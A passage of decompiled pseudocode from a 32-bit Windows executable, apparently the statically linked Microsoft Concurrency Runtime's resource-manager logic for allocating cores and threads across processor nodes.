      v10 = *(_DWORD *)(v9 + 160) - v4[9] - v8 - v6;
      v2 = i;
      v4[12] = v10;
    }
  }
  v11 = 0;
  v12 = 0;
  this[8] = 0;
  v37 = 0;
  v32 = 0;
  if ( this[6] )
  {
    v13 = 0;
    v35 = 0;
    do
    {
      v14 = (_DWORD *)(v13 + this[18]);
      if ( v14[1] )
      {
        v15 = 0;
        v16 = 0;
        do
        {
          v17 = (_DWORD *)(v16 + v14[8]);
          if ( v17[4] )
          {
            v11 = v37;
            if ( v17[4] == v17[7] )
            {
              *v17 = 6;
              ++v14[7];
              ++this[8];
            }
          }
          else
          {
            *v17 = 2;
            ++v14[2];
            v11 = ++v37;
          }
          ++v15;
          v16 += 36;
        }
        while ( v15 < v14[1] );
        v12 = v32;
        v13 = v35;
      }
      ++v12;
      v13 += 40;
      v32 = v12;
      v35 = v13;
    }
    while ( v12 < this[6] );
  }
  this[9] = 0;
  v18 = v11 + v34;
  v36 = v11 + v34;
  for ( j = 0; (v18 || this[8]) && j < 2; j = this[9] )
  {
    if ( j == 1 )
      sub_43292A(this);
    v20 = 0;
    v21 = 0;
    v22 = 0;
    v33 = 0;
    if ( this[2] )
    {
      do
      {
        v23 = *(_DWORD *)(this[21] + 4 * v22);
        if ( *(_DWORD *)(*(_DWORD *)(v23 + 16) + 160) < *(_DWORD *)(v23 + 36) )
        {
          *(_DWORD *)(this[23] + 4 * v20) = v23;
          v33 = v20 + 1;
          v21 += *(_DWORD *)(v23 + 36) - *(_DWORD *)(*(_DWORD *)(v23 + 16) + 160);
          ++v20;
        }
        ++v22;
      }
      while ( v22 < this[2] );
      v18 = v36;
      if ( v20 )
      {
        if ( v36 )
        {
          v24 = sub_430A2C(this, v36, v21, v20);
          v30 = sub_433255(this, v33);
          v25 = 0;
          if ( v37 >= v24 )
          {
            v26 = v24;
            v37 -= v24;
          }
          else
          {
            v26 = v37;
            v25 = v24 - v37;
            v37 = 0;
            if ( v25 >= v34 )
              v25 = v34;
            v34 -= v25;
          }
          sub_43168A(this, v24, v26, v25, v30, i);
          v36 -= v24;
          v21 -= v24;
          v20 = v33;
          v18 = v36;
        }
        if ( v21 )
        {
          if ( this[8] )
          {
            v27 = sub_430A2C(this, this[8], v21, v20);
            v28 = sub_433255(this, v33);
            sub_4317C7(this, v27, v28);
            this[8] -= v27;
            v18 = v36;
          }
        }
      }
    }
    ++this[9];
  }
  return sub_433E1B(this);
}

//----- (00431B9C) --------------------------------------------------------
void __thiscall sub_431B9C(_DWORD *this, _DWORD *a2, int a3, int a4, char a5)
{
  int v5; // edx
  int v6; // edi
  _DWORD *v7; // esi
  int i; // ecx
  _DWORD *v9; // eax
  int v10; // [esp+Ch] [ebp-4h]

  v5 = a3;
  v6 = 0;
  v7 = (_DWORD *)(this[18] + 40 * a3);
  for ( i = 0; ; i += 36 )
  {
    v9 = (_DWORD *)(i + v7[8]);
    v10 = i;
    if ( *v9 == 2 && !a5 )
      break;
    if ( *v9 == 6 && a5 )
      break;
LABEL_11:
    ++v6;
  }
  ++v9[4];
  *v9 = 0;
  if ( a5 )
    --v7[7];
  else
    --v7[2];
  sub_43B057(a2, a2[4] + 52 * v5, v6, a5);
  if ( --a4 )
  {
    i = v10;
    v5 = a3;
    goto LABEL_11;
  }
}

//----- (00431C09) --------------------------------------------------------
void __thiscall sub_431C09(_DWORD *this, _DWORD *a2, _DWORD *a3, int a4, unsigned int a5)
{
  _DWORD *v5; // ebx
  unsigned int v6; // edx
  unsigned int v7; // esi
  unsigned int v8; // edi
  unsigned int v9; // ebx
  unsigned int v10; // esi
  unsigned int v11; // esi
  int v12; // ecx
  int v13; // edx
  char v14; // al
  _DWORD *v15; // [esp+10h] [ebp-2Ch]
  int v16; // [esp+14h] [ebp-28h]
  char v17; // [esp+1Ch] [ebp-20h]
  int v19; // [esp+24h] [ebp-18h]
  int v20; // [esp+28h] [ebp-14h]
  int v21; // [esp+2Ch] [ebp-10h]
  int v22; // [esp+30h] [ebp-Ch]
  unsigned int v23; // [esp+34h] [ebp-8h]
  char v24; // [esp+3Ah] [ebp-2h]
  char v25; // [esp+3Bh] [ebp-1h]

  v5 = (_DWORD *)(52 * a4 + *(_DWORD *)(a2[4] + 16));
  v15 = (_DWORD *)a2[4];
  v22 = (int)v5;
  v6 = v5[11];
  if ( a5 >= v6 )
  {
    v7 = v5[11];
    v23 = v7;
  }
  else
  {
    v7 = a5;
    v23 = a5;
  }
  v8 = a5 - v7;
  if ( a5 - v7 >= v5[8] - v6 )
    v8 = v5[8] - v6;
  v9 = v5[10] - v6;
  v10 = a5 - v8 - v23;
  if ( v10 < v9 )
    v9 = a5 - v8 - v23;
  v11 = v10 - v9;
  v21 = 0;
  v19 = 0;
  v20 = 0;
  v12 = v22;
  while ( 1 )
  {
    v13 = v20 + *(_DWORD *)(v12 + 48);
    v16 = v13;
    if ( *(_DWORD *)v13 == 4 && !*(_DWORD *)(v13 + 40) )
      break;
LABEL_31:
    ++v21;
    v20 += 52;
    v19 += 36;
  }
  v24 = *(_BYTE *)(v13 + 49);
  if ( v24 )
  {
    v25 = *(_BYTE *)(v13 + 48);
    if ( v25 && v23 )
    {
      --v23;
    }
    else
    {
      if ( !v8 )
        goto LABEL_31;
      --v8;
    }
  }
  else
  {
    v25 = *(_BYTE *)(v13 + 48);
    v12 = v22;
    if ( v25 && v9 )
    {
      --v9;
    }
    else
    {
      if ( !v11 )
        goto LABEL_31;
      --v11;
    }
  }
  v14 = v25;
  if ( v25 )
  {
    sub_4344ED(
      this,
      v22,
      v13,
      (_DWORD *)(40 * a4 + this[18]),
      (_DWORD *)(v19 + *(_DWORD *)(40 * a4 + this[18] + 32)),
      a2);
    v24 = *(_BYTE *)(v16 + 49);
    v14 = v25;
  }
  v17 = 0;
  if ( v24 )
  {
    v17 = 1;
    if ( v14 )
      --a2[10];
    else
      --a2[11];
  }
  else
  {
    --a2[12];
  }
  sub_43BCD2(v15, v22, v21);
  sub_43B057(a3, 52 * a4 + a3[4], v21, v17);
  if ( --a5 )
  {
    v12 = v22;
    goto LABEL_31;
  }
}

//----- (00431D7C) --------------------------------------------------------
int __stdcall sub_431D7C(LPVOID lpThreadParameter)
{
  sub_431D95((int)lpThreadParameter);
  sub_430280(0);
  return 0;
}

//----- (00431D95) --------------------------------------------------------
void __thiscall sub_431D95(int this)
{
  DWORD v2; // ebx
  struct _RTL_CRITICAL_SECTION *i; // esi
  int v4; // eax
  unsigned int v5; // esi
  DWORD v6; // [esp+14h] [ebp-18h]
  int TickCount64; // [esp+1Ch] [ebp-10h]

  v2 = 100;
  TickCount64 = j____crtGetTickCount64() - 500;
  if ( *(_DWORD *)(this + 40) != 2 )
  {
    for ( i = (struct _RTL_CRITICAL_SECTION *)(this + 44); ; i = (struct _RTL_CRITICAL_SECTION *)(this + 44) )
    {
      v6 = WaitForSingleObjectEx(*(HANDLE *)(this + 80), v2, 0);
      sub_42E75B(i);
      v4 = *(_DWORD *)(this + 40);
      if ( v4 )
      {
        if ( v4 != 1 )
          goto LABEL_17;
        if ( v6 == 258 )
        {
          sub_43195A((int *)this);
LABEL_10:
          if ( *(_DWORD *)(this + 16) )
            sub_434137((_DWORD *)this, 0);
          goto LABEL_12;
        }
        v5 = j____crtGetTickCount64() - TickCount64;
        if ( v5 > 0x64 )
        {
          if ( v5 <= 0x82 )
            goto LABEL_10;
          sub_431485((_DWORD *)this);
LABEL_12:
          TickCount64 = j____crtGetTickCount64();
          v2 = 100;
          goto LABEL_17;
        }
        if ( *(_DWORD *)(this + 16) )
          sub_434137((_DWORD *)this, 0);
        v2 = 100 - v5;
      }
      else
      {
        v2 = sub_4314EA((_DWORD *)this) ? -1 : 100;
      }
LABEL_17:
      sub_42E8A1((LPCRITICAL_SECTION)(this + 44));
      if ( *(_DWORD *)(this + 40) == 2 )
        return;
    }
  }
}
// 43001E: using guessed type __int64 j____crtGetTickCount64(void);

//----- (00431E95) --------------------------------------------------------
unsigned int __thiscall sub_431E95(_DWORD *this, unsigned int *a2, unsigned int *a3, int a4, int a5, unsigned int a6)
{
  int v7; // ecx
  int v8; // esi
  unsigned int v9; // ebx
  unsigned int v10; // eax
  int v11; // eax
  int v12; // edx
  unsigned int v13; // edi
  unsigned int v14; // edx
  unsigned int v15; // eax
  unsigned int *v16; // eax
  unsigned int v17; // esi
  int v18; // ecx
  _DWORD *v19; // esi
  int v20; // edx
  int v21; // edx
  unsigned int v22; // eax
  int v23; // edx
  int v24; // eax
  unsigned int v25; // edx
  unsigned int v26; // eax
  bool v27; // cf
  unsigned int v28; // eax
  bool v29; // zf
  int v30; // edx
  unsigned int v31; // eax
  unsigned int v32; // esi
  unsigned int v33; // eax
  unsigned int v34; // ecx
  unsigned int *v35; // eax
  unsigned int v36; // esi
  _DWORD *v37; // edx
  _DWORD *v38; // ecx
  int v39; // eax
  int v40; // ebx
  unsigned int v41; // ecx
  unsigned int v42; // eax
  unsigned int v43; // eax
  unsigned int v44; // ecx
  int v45; // edx
  int v46; // ecx
  char v47; // al
  _DWORD *v49; // [esp+Ch] [ebp-50h]
  unsigned int v50; // [esp+10h] [ebp-4Ch]
  int v51; // [esp+14h] [ebp-48h]
  int v52; // [esp+18h] [ebp-44h]
  unsigned int v53; // [esp+1Ch] [ebp-40h]
  unsigned int v54; // [esp+20h] [ebp-3Ch]
  int v55; // [esp+24h] [ebp-38h]
  unsigned int v56; // [esp+24h] [ebp-38h]
  unsigned int v57; // [esp+24h] [ebp-38h]
  int v58; // [esp+28h] [ebp-34h]
  int v59; // [esp+2Ch] [ebp-30h]
  int v60; // [esp+2Ch] [ebp-30h]
  unsigned int v61; // [esp+30h] [ebp-2Ch]
  unsigned int v62; // [esp+34h] [ebp-28h]
  unsigned int v63; // [esp+38h] [ebp-24h]
  int v64; // [esp+3Ch] [ebp-20h]
  int v65; // [esp+40h] [ebp-1Ch]
  unsigned int v66; // [esp+44h] [ebp-18h]
  unsigned int v67; // [esp+48h] [ebp-14h]
  int v68; // [esp+4Ch] [ebp-10h]
  _DWORD *v69; // [esp+50h] [ebp-Ch]
  int v70; // [esp+54h] [ebp-8h]
  char v71; // [esp+5Bh] [ebp-1h]

  v7 = a4;
  v69 = this;
  v49 = *(_DWORD **)(a4 + 16);
  v8 = v49[5];
  v65 = v49[4];
  v9 = 0;
  v68 = v8;
  v54 = 0;
  if ( a5 == 1 )
    v71 = 0;
  else
    v71 = *(_BYTE *)(a4 + 32);
  v10 = *(_DWORD *)(a4 + 44);
  v53 = 0;
  v58 = -1;
  v66 = 0;
  v61 = 0;
  v59 = v10;
  v50 = this[6];
  if ( v10 >= v50 )
    goto LABEL_79;
  do
  {
    v11 = *(_DWORD *)(v8 + 4 * v10);
    v12 = 52 * v11;
    v55 = 52 * v11;
    v13 = v66;
    if ( *(_DWORD *)(52 * v11 + v65 + 28) )
      goto LABEL_40;
    v62 = *(_DWORD *)(v7 + 4);
    if ( v62 >= *(_DWORD *)(v12 + v65 + 4) )
      v62 = *(_DWORD *)(v12 + v65 + 4);
    v14 = 0;
    v13 = v66;
    v63 = 0;
    v70 = 0;
    if ( *a2 )
    {
      v15 = *(_DWORD *)(40 * v11 + v69[18] + 8);
      if ( v15 )
      {
        if ( *a2 < v15 )
          v15 = *a2;
        v63 = v15;
        v14 = 1;
        v70 = 1;
      }
      v7 = a4;
    }
    v16 = a3;
    v17 = 0;
    v67 = 0;
    if ( *a3 )
    {
      v64 = 0;
      if ( a6 )
      {
        v18 = v55;
        while ( 1 )
        {
          if ( v17 >= *v16 )
          {
LABEL_33:
            v13 = v66;
            v9 = 0;
            v7 = a4;
            break;
          }
          v19 = *(_DWORD **)(v69[22] + 4 * v64);
          v20 = v19[4];
          if ( *(_DWORD *)(v20 + 160) > v19[9]
            && (v21 = *(_DWORD *)(v20 + 16), (v52 = *(_DWORD *)(v18 + v21 + 28) - *(_DWORD *)(v18 + v21 + 36)) != 0) )
          {
            v22 = *(_DWORD *)(v18 + v21 + 44);
            v56 = v19[10];
            if ( v22 < v56 )
              v56 = *(_DWORD *)(v18 + v21 + 44);
            v51 = *(_DWORD *)(v18 + v21 + 32);
            v23 = v51 - v22;
            if ( v51 - v22 >= v19[11] )
              v23 = v19[11];
            v24 = v52 - v51;
            if ( (unsigned int)(v52 - v51) >= v19[12] )
              v24 = v19[12];
            v17 = v67;
            v25 = v56 + v24 + v23;
            if ( v25 )
            {
              v26 = *a3 - v67;
              if ( v26 >= v25 )
                v26 = v25;
              v17 = v26 + v67;
              v14 = v70 + 1;
              v67 += v26;
              ++v70;
              goto LABEL_32;
            }
          }
          else
          {
            v17 = v67;
          }
          v14 = v70;
LABEL_32:
          v27 = ++v64 < a6;
          v16 = a3;
          if ( !v27 )
            goto LABEL_33;
        }
      }
    }
    v28 = v17 + v63;
    if ( v71 )
    {
      v29 = v28 == v62;
LABEL_36:
      if ( !v29 || v14 <= v61 )
        goto LABEL_39;
      goto LABEL_38;
    }
    if ( v13 >= v62 || v28 <= v13 )
    {
      v29 = v28 == v13;
      goto LABEL_36;
    }
LABEL_38:
    v58 = v59;
    v13 = v17 + v63;
    v66 = v17 + v63;
    v61 = v14;
LABEL_39:
    v8 = v49[5];
LABEL_40:
    v10 = v59 + 1;
    v59 = v10;
  }
  while ( v10 < v50 );
  if ( v58 == -1 )
  {
LABEL_79:
    v47 = 0;
    goto LABEL_80;
  }
  v30 = *(_DWORD *)(v8 + 4 * v58);
  v31 = *(_DWORD *)(v7 + 4);
  v60 = v30;
  if ( v31 < v13 )
    v13 = *(_DWORD *)(v7 + 4);
  *(_DWORD *)(v7 + 4) = v31 - v13;
  v53 = v13;
  v32 = *a2;
  if ( *a2 )
  {
    v33 = *(_DWORD *)(40 * v30 + v69[18] + 8);
    if ( v33 )
    {
      v34 = *a2;
      if ( v32 >= v33 )
        v34 = *(_DWORD *)(40 * v30 + v69[18] + 8);
      if ( v34 >= v13 )
      {
        v32 = v13;
      }
      else if ( v32 >= v33 )
      {
        v32 = *(_DWORD *)(40 * v30 + v69[18] + 8);
      }
      sub_431B9C(v69, v49, v30, v32, 0);
      *a2 -= v32;
      v13 -= v32;
    }
  }
  if ( v13 )
  {
    v35 = a3;
    if ( *a3 )
    {
      do
      {
        if ( v9 >= a6 )
          break;
        v36 = *v35;
        if ( !*v35 )
          break;
        v37 = *(_DWORD **)(v69[22] + 4 * v9);
        if ( *(_DWORD *)(v37[4] + 160) <= v37[9] )
          goto LABEL_76;
        v38 = (_DWORD *)(*(_DWORD *)(v37[4] + 16) + 52 * v60);
        v39 = v38[7] - v38[9];
        if ( !v39 )
          goto LABEL_76;
        v57 = v37[10];
        if ( v38[11] < v57 )
          v57 = v38[11];
        v40 = v38[8];
        v41 = v40 - v38[11];
        if ( v41 >= v37[11] )
          v41 = v37[11];
        v42 = v39 - v40;
        if ( v42 >= v37[12] )
          v42 = v37[12];
        v9 = v54;
        v43 = v57 + v41 + v42;
        if ( v43 )
        {
          v44 = v36;
          if ( v36 >= v43 )
            v44 = v43;
          if ( v44 >= v13 )
          {
            v36 = v13;
          }
          else if ( v36 >= v43 )
          {
            v36 = v43;
          }
          sub_431C09(v69, v37, *(_DWORD **)(a4 + 16), v60, v36);
          v35 = a3;
          *a3 -= v36;
          v13 -= v36;
        }
        else
        {
LABEL_76:
          v35 = a3;
        }
        v54 = ++v9;
      }
      while ( v13 );
    }
  }
  v45 = *(_DWORD *)(a4 + 44);
  v46 = *(_DWORD *)(v68 + 4 * v45);
  *(_DWORD *)(v68 + 4 * v45) = *(_DWORD *)(v68 + 4 * v58);
  *(_DWORD *)(v68 + 4 * v58) = v46;
  v7 = a4;
  ++*(_DWORD *)(a4 + 44);
  v47 = 1;
LABEL_80:
  *(_BYTE *)(v7 + 32) = v47;
  return v53;
}

//----- (004321D6) --------------------------------------------------------
unsigned int __thiscall sub_4321D6(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v4; // ebx
  int v5; // eax
  int v6; // edi
  unsigned int v7; // eax
  int v8; // ecx
  unsigned int v9; // eax
  int v10; // edx
  int v11; // ecx
  char v12; // al
  unsigned int v14; // [esp+Ch] [ebp-28h]
  int v15; // [esp+10h] [ebp-24h]
  int v16; // [esp+14h] [ebp-20h]
  int v17; // [esp+18h] [ebp-1Ch]
  unsigned int v18; // [esp+1Ch] [ebp-18h]
  unsigned int v20; // [esp+24h] [ebp-10h]
  int v21; // [esp+28h] [ebp-Ch]
  int v22; // [esp+2Ch] [ebp-8h]
  char v23; // [esp+33h] [ebp-1h]

  v4 = 0;
  v5 = *(_DWORD *)(a3 + 16);
  v6 = *(_DWORD *)(v5 + 20);
  v17 = *(_DWORD *)(v5 + 16);
  if ( a4 == 1 )
    v23 = 0;
  else
    v23 = *(_BYTE *)(a3 + 32);
  v7 = *(_DWORD *)(a3 + 44);
  v22 = -1;
  v20 = 0;
  v21 = v7;
  v14 = this[6];
  v8 = -1;
  if ( v7 >= this[6] )
  {
LABEL_25:
    v12 = 0;
    goto LABEL_26;
  }
  do
  {
    v15 = *(_DWORD *)(v6 + 4 * v7);
    v16 = v17 + 52 * v15;
    if ( *(_DWORD *)(v16 + 28) )
      goto LABEL_16;
    v18 = *(_DWORD *)(a3 + 4);
    if ( v18 >= *(_DWORD *)(v16 + 4) )
      v18 = *(_DWORD *)(v16 + 4);
    v9 = *(_DWORD *)(40 * v15 + this[18] + 28);
    if ( v9 )
    {
      if ( a2 < v9 )
        v9 = a2;
    }
    else
    {
      v9 = 0;
    }
    if ( v23 )
    {
      if ( v9 == v18 )
        goto LABEL_23;
    }
    else if ( v9 > v20 )
    {
LABEL_23:
      v8 = v21;
      v22 = v21;
      v20 = v9;
      if ( v23 )
        goto LABEL_18;
      goto LABEL_15;
    }
    v8 = v22;
LABEL_15:
    v7 = v21;
LABEL_16:
    v21 = ++v7;
  }
  while ( v7 < v14 );
  v9 = v20;
LABEL_18:
  if ( v8 == -1 )
    goto LABEL_25;
  v4 = *(_DWORD *)(a3 + 4);
  if ( v4 >= v9 )
    v4 = v9;
  sub_431B9C(this, *(_DWORD **)(a3 + 16), *(_DWORD *)(v6 + 4 * v8), v4, 1);
  v10 = *(_DWORD *)(a3 + 44);
  *(_DWORD *)(a3 + 4) -= v4;
  v11 = *(_DWORD *)(v6 + 4 * v10);
  *(_DWORD *)(v6 + 4 * v10) = *(_DWORD *)(v6 + 4 * v22);
  *(_DWORD *)(v6 + 4 * v22) = v11;
  ++*(_DWORD *)(a3 + 44);
  v12 = 1;
LABEL_26:
  *(_BYTE *)(a3 + 32) = v12;
  return v4;
}

//----- (004322F0) --------------------------------------------------------
char __thiscall sub_4322F0(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5)
{
  char v5; // bl
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // edx
  int v9; // edi
  unsigned int v10; // ecx
  _DWORD *v11; // ecx
  int v12; // edx
  int v14; // [esp+Ch] [ebp-10h]
  unsigned int v15; // [esp+10h] [ebp-Ch]
  int v16; // [esp+14h] [ebp-8h]

  v5 = 0;
  v6 = a4[4];
  v14 = *(_DWORD *)(v6 + 16);
  v7 = *(_DWORD *)(*(_DWORD *)(v6 + 20) + 4 * a4[11]);
  v8 = this;
  v9 = 52 * v7;
  v16 = v7;
  if ( *a2 && *(_DWORD *)(40 * v7 + this[18] + 8) )
  {
    v5 = 1;
    sub_431B9C(this, (_DWORD *)a4[4], v7, 1, 0);
    --*a2;
  }
  else
  {
    if ( !*a3 || (v10 = 0, v15 = 0, !a5) )
    {
LABEL_20:
      ++a4[11];
      return v5;
    }
    while ( !v5 )
    {
      v11 = *(_DWORD **)(v8[22] + 4 * v10);
      if ( *(_DWORD *)(v11[4] + 160) > v11[9] )
      {
        v12 = *(_DWORD *)(v11[4] + 16);
        if ( *(_DWORD *)(v9 + v12 + 44)
          || *(_DWORD *)(v9 + v12 + 32) != *(_DWORD *)(v9 + v12 + 44) && v11[11]
          || *(_DWORD *)(v9 + v12 + 28) != *(_DWORD *)(v9 + v12 + 36) && v11[12] )
        {
          v5 = 1;
          sub_431C09(this, v11, (_DWORD *)a4[4], v16, 1u);
          --*a3;
        }
        v8 = this;
      }
      v10 = v15 + 1;
      v15 = v10;
      if ( v10 >= a5 )
      {
        if ( !v5 )
          goto LABEL_20;
        break;
      }
    }
  }
  if ( *(_DWORD *)(v9 + v14 + 28) == *(_DWORD *)(v9 + v14 + 4) )
    ++a4[11];
  --a4[1];
  return v5;
}

//----- (004323F9) --------------------------------------------------------
int __thiscall sub_4323F9(_DWORD *this, __int16 a2)
{
  unsigned __int16 v2; // si
  unsigned __int16 v3; // dx
  int v4; // ecx
  int result; // eax

  v2 = *(_WORD *)this;
  v3 = 0;
  if ( !*(_WORD *)this )
    return 0;
  v4 = this[1];
  while ( 1 )
  {
    result = v4 + 12 * v3;
    if ( *(_WORD *)(result + 4) == a2 )
      break;
    if ( ++v3 >= v2 )
      return 0;
  }
  return result;
}

//----- (0043242D) --------------------------------------------------------
_BYTE *__thiscall sub_43242D(_DWORD *this)
{
  _BYTE *result; // eax
  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF

  flOldProtect = (DWORD)this;
  if ( dword_4927DC >= 3 )
    return (_BYTE *)__crtFlushProcessWriteBuffers(flOldProtect);
  result = (_BYTE *)this[35];
  if ( *result == 1 )
    return (_BYTE *)VirtualProtect(result, 1u, 2u, &flOldProtect);
  return result;
}
// 42C085: using guessed type int __cdecl __crtFlushProcessWriteBuffers(_DWORD);
// 4927DC: using guessed type int dword_4927DC;

//----- (0043245D) --------------------------------------------------------
int sub_43245D()
{
  int result; // eax

  result = dword_4927CC;
  if ( !dword_4927CC )
  {
    sub_4304E3(&dword_492820);
    result = dword_4927CC;
    if ( !dword_4927CC )
    {
      sub_432B72(0);
      result = dword_4927CC;
    }
    dword_492820 = 0;
  }
  return result;
}
// 4927CC: using guessed type int dword_4927CC;
// 492820: using guessed type int dword_492820;

//----- (004324A8) --------------------------------------------------------
int __thiscall sub_4324A8(_DWORD *this, unsigned int *a2)
{
  int v3; // eax
  int v4; // edx
  int v5; // eax
  int v6; // edi
  _DWORD *v7; // ecx
  unsigned int v8; // edx
  _BYTE *v9; // esi
  int v11; // ebx
  int v12; // eax
  _DWORD *v13; // ecx
  unsigned __int8 *v14; // esi
  char pExceptionObject[12]; // [esp+Ch] [ebp-14h] BYREF
  int v16; // [esp+18h] [ebp-8h]
  unsigned __int16 v17; // [esp+1Ch] [ebp-4h] BYREF
  char v18; // [esp+1Eh] [ebp-2h]

  v3 = sub_434554();
  if ( v3 >= 4 )
  {
    sub_42FE17((int)&v17);
    v4 = v17;
    v5 = 1 << (v18 & 0x1F);
    v6 = 0;
    v7 = (_DWORD *)this[18];
    v16 = v5;
    while ( 1 )
    {
      if ( v7[3] == v4 && (v5 & *v7) != 0 )
      {
        v8 = 0;
        if ( v7[1] )
        {
          v9 = (_BYTE *)(v7[8] + 8);
          while ( *v9 != (v18 & 0x1F) )
          {
            ++v8;
            v9 += 36;
            if ( v8 >= v7[1] )
            {
              v5 = v16;
              goto LABEL_10;
            }
          }
LABEL_26:
          if ( a2 )
            *a2 = v8;
          return v6;
        }
LABEL_10:
        v4 = v17;
      }
      ++v6;
      v7 += 10;
    }
  }
  if ( v3 == 2 || v3 == 3 )
  {
    v11 = __crtGetCurrentProcessorNumber() & 0x1F;
    v12 = 1 << v11;
    v6 = 0;
    v13 = (_DWORD *)this[18];
    v16 = 1 << v11;
    while ( 1 )
    {
      if ( (v12 & *v13) != 0 )
      {
        v8 = 0;
        if ( v13[1] )
        {
          v14 = (unsigned __int8 *)(v13[8] + 8);
          do
          {
            if ( *v14 == v11 )
              goto LABEL_26;
            ++v8;
            v14 += 36;
          }
          while ( v8 < v13[1] );
          v12 = v16;
        }
      }
      ++v6;
      v13 += 10;
    }
  }
  if ( dword_4927DC != 1 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
  }
  if ( a2 )
    *a2 = 0;
  return 0;
}
// 42C0BD: using guessed type int __crtGetCurrentProcessorNumber(void);
// 4927DC: using guessed type int dword_4927DC;

//----- (004325A1) --------------------------------------------------------
int __thiscall sub_4325A1(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 4);
}

//----- (004325A8) --------------------------------------------------------
int __thiscall sub_4325A8(_DWORD *this)
{
  return *(_DWORD *)(*(_DWORD *)(this[1] + 32) + 32);
}

//----- (004325B2) --------------------------------------------------------
int __thiscall sub_4325B2(_DWORD *this)
{
  return *(_DWORD *)(this[18] + 36);
}

//----- (004325B9) --------------------------------------------------------
int __thiscall sub_4325B9(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 16);
}

//----- (004325C0) --------------------------------------------------------
int __thiscall sub_4325C0(int *this)
{
  int v1; // eax

  v1 = sub_4325EE(*(_DWORD **)(this[1] + 12), this[1]);
  if ( v1 )
    return *(_DWORD *)(v1 + 32);
  else
    return 0;
}

//----- (004325D7) --------------------------------------------------------
int __thiscall sub_4325D7(int *this)
{
  int v1; // eax

  v1 = sub_432613(*(_DWORD **)(this[1] + 24), this[1]);
  if ( v1 )
    return *(_DWORD *)(v1 + 36);
  else
    return 0;
}

//----- (004325EE) --------------------------------------------------------
int __thiscall sub_4325EE(_DWORD *this, int a2)
{
  unsigned int v2; // eax

  v2 = (a2 - this[8]) / 36 + 1;
  if ( v2 >= this[1] )
    return 0;
  else
    return this[8] + 36 * v2;
}

//----- (00432613) --------------------------------------------------------
int __thiscall sub_432613(_DWORD *this, int a2)
{
  unsigned int v2; // eax

  v2 = (a2 - this[18]) / 40 + 1;
  if ( v2 >= this[6] )
    return 0;
  else
    return this[18] + 40 * v2;
}

//----- (00432638) --------------------------------------------------------
int sub_432638()
{
  int result; // eax

  result = dword_4927D4;
  if ( !dword_4927D4 )
  {
    sub_4304E3(&dword_492820);
    result = dword_4927D4;
    if ( !dword_4927D4 )
    {
      sub_432B72(0);
      result = dword_4927D4;
    }
    dword_492820 = 0;
  }
  return result;
}
// 4927D4: using guessed type int dword_4927D4;
// 492820: using guessed type int dword_492820;

//----- (00432683) --------------------------------------------------------
int __thiscall sub_432683(_DWORD *this)
{
  return *(_DWORD *)(this[1] + 20);
}

//----- (004326A6) --------------------------------------------------------
void *__cdecl sub_4326A6(int a1)
{
  void *result; // eax

  if ( dword_4927DC < 4 )
    result = sub_42FE39(&ReturnedLength);
  else
    result = sub_42FEC0(a1, &ReturnedLength);
  Block = result;
  return result;
}
// 4927DC: using guessed type int dword_4927DC;

//----- (004326CF) --------------------------------------------------------
unsigned int __thiscall sub_4326CF(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v3; // edx
  unsigned int result; // eax
  int v5; // ecx
  _DWORD *v6; // esi
  unsigned int v7; // ebx
  int v8; // eax
  int v9; // edi
  _DWORD *v10; // eax
  int v11; // ecx
  unsigned int v12; // [esp+8h] [ebp-18h]
  int v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+14h] [ebp-Ch]
  int v16; // [esp+1Ch] [ebp-4h]

  v3 = this;
  result = 0;
  v12 = 0;
  if ( this[6] )
  {
    v5 = 0;
    v6 = (_DWORD *)(a2[4] + 44);
    v16 = 0;
    do
    {
      if ( *(v6 - 3) )
      {
        v7 = 0;
        if ( *(v6 - 10) )
        {
          v14 = 0;
          v8 = 0;
          v13 = 0;
          do
          {
            v9 = v8 + v6[1];
            if ( *(_DWORD *)v9 == 4 && *(_BYTE *)(v9 + 49) )
            {
              v10 = (_DWORD *)(v14 + *(_DWORD *)(v5 + v3[18] + 32));
              v11 = v10[4];
              if ( v11 == 1 )
              {
                sub_43BED9(a2, (int)(v6 - 11), v7);
                v3 = this;
                v5 = v16;
                if ( *(_BYTE *)(v9 + 48) )
                {
                  --*v6;
                  --a3[6];
                }
              }
              else
              {
                if ( v11 - v10[7] > (unsigned int)(*(_BYTE *)(v9 + 48) == 0) )
                {
                  v10[4] = v11 - 1;
                  if ( *(_BYTE *)(v9 + 48) )
                    sub_4344ED(v3, (int)(v6 - 11), v9, (_DWORD *)(v16 + v3[18]), v10, a3);
                  sub_43BCD2(a2, (int)(v6 - 11), v7);
                  v3 = this;
                }
                v5 = v16;
              }
            }
            v13 += 52;
            ++v7;
            v14 += 36;
            v8 = v13;
          }
          while ( v7 < *(v6 - 10) );
          result = v12;
        }
      }
      ++result;
      v5 += 40;
      v6 += 13;
      v12 = result;
      v16 = v5;
    }
    while ( result < v3[6] );
  }
  return result;
}

//----- (004327E9) --------------------------------------------------------
unsigned int __thiscall sub_4327E9(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  unsigned int v3; // eax
  int v4; // esi
  int v5; // edi
  unsigned int v6; // esi
  unsigned int result; // eax
  unsigned int v8; // edx
  _DWORD *v9; // edi
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // ecx
  _DWORD *v13; // edx
  unsigned int v14; // eax
  unsigned int v15; // [esp+10h] [ebp-18h]
  unsigned int v16; // [esp+14h] [ebp-14h]
  int v17; // [esp+18h] [ebp-10h]
  int v18; // [esp+1Ch] [ebp-Ch]
  int v20; // [esp+24h] [ebp-4h]

  v3 = sub_432E07(a2);
  v4 = a2[40];
  v5 = v4 - a2[42];
  v6 = v4 - a3[9] - a3[6];
  result = v5 - (a2[46] + v3);
  if ( v6 >= result )
  {
    result = a2[46] + sub_432E07(a2);
    v6 = v5 - result;
  }
  v8 = 0;
  v15 = 0;
  if ( v6 )
  {
    v18 = 0;
    v9 = (_DWORD *)(a2[4] + 36);
    do
    {
      result = (unsigned int)this;
      if ( v8 >= this[6] )
        break;
